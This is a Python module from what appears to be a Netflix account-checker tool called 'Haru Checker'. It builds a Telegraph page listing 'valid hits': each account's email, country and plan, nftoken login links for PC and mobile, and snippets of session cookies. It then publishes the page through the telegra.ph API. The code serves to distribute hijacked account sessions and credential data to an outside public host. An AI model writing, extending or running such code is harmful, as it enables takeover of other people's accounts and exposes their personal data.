import requests
import json

TELEGRAPH_CREATE_ACCOUNT = "https://api.telegra.ph/createAccount"
TELEGRAPH_CREATE_PAGE = "https://api.telegra.ph/createPage"

# Cache token biar gak create tiap request (in-memory)
_cached_token = None

def get_telegraph_token():
    global _cached_token
    if _cached_token:
        return _cached_token
    try:
        r = requests.get(TELEGRAPH_CREATE_ACCOUNT, params={
            "short_name": "HaruChecker",
            "author_name": "HaruChecker",
            "author_url": "https://t.me/harumidesu"
        }, timeout=10)
        data = r.json()
        if data.get("ok") and data.get("result", {}).get("access_token"):
            _cached_token = data["result"]["access_token"]
            return _cached_token
    except Exception as e:
        print(f"telegraph createAccount error: {e}")
    return None

def build_content(valid_blocks, valid_infos):
    """Build telegraph nodes: list of dicts"""
    nodes = []
    nodes.append({"tag": "h3", "children": ["🎬 Haru Checker — Netflix Hits"]})
    nodes.append({"tag": "p", "children": [f"Total Valid: {len(valid_blocks)} accounts"]})
    nodes.append({"tag": "hr"})
    for idx, (block, info) in enumerate(zip(valid_blocks, valid_infos)):
        email = info.get("email") or "unknown"
        country = info.get("countryOfSignup") or "??"
        plan = info.get("localizedPlanName") or info.get("planPrice") or "Unknown"
        # Token links are inside block text - extract nftoken url if exists
        # block contains https://www.netflix.com/browse?nftoken=...
        import re
        m = re.search(r"https://www\.netflix\.com/[^\s]+nftoken=[A-Za-z0-9_\-]+", block)
        pc_url = m.group(0) if m else None
        # fallback mobile
        mobile_url = pc_url.replace("/browse", "/unsupported") if pc_url else None

        nodes.append({"tag": "h4", "children": [f"{idx+1:03d} — {email} ({country}) — {plan}"]})
        # email + country
        nodes.append({"tag": "p", "children": [f"Email: {email} | Country: {country} | Plan: {plan}"]})
        if pc_url:
            nodes.append({"tag": "p", "children": [
                {"tag": "a", "attrs": {"href": pc_url}, "children": ["🖥 PC Login"]},
                "  |  ",
                {"tag": "a", "attrs": {"href": mobile_url}, "children": ["📱 Mobile Login"]}
            ]})
        # cookie snippet (first 120 chars)
        cookie_snippet = ""
        if "Cookie:" in block:
            try:
                cookie_snippet = block.split("Cookie:")[-1].strip().split("\n")[0][:120] + "..."
            except:
                pass
        if cookie_snippet:
            nodes.append({"tag": "p", "children": [{"tag": "code", "children": [cookie_snippet]}]})
        nodes.append({"tag": "hr"})
    nodes.append({"tag": "p", "children": ["🤖 Powered by @harumisatou — Haru Checker"]})
    return nodes

def create_telegraph_page(valid_blocks, valid_infos, title="Haru Checker — Netflix Hits"):
    if not valid_blocks:
        return None, "no valid"
    token = get_telegraph_token()
    if not token:
        return None, "no token"
    try:
        content = build_content(valid_blocks, valid_infos)
        r = requests.post(TELEGRAPH_CREATE_PAGE, data={
            "access_token": token,
            "title": title,
            "author_name": "HaruChecker",
            "author_url": "https://t.me/harumidesu",
            "content": json.dumps(content),
            "return_content": False
        }, timeout=15)
        data = r.json()
        if data.get("ok"):
            url = data["result"]["url"]
            return url, None
        else:
            return None, str(data)
    except Exception as e:
        return None, str(e)
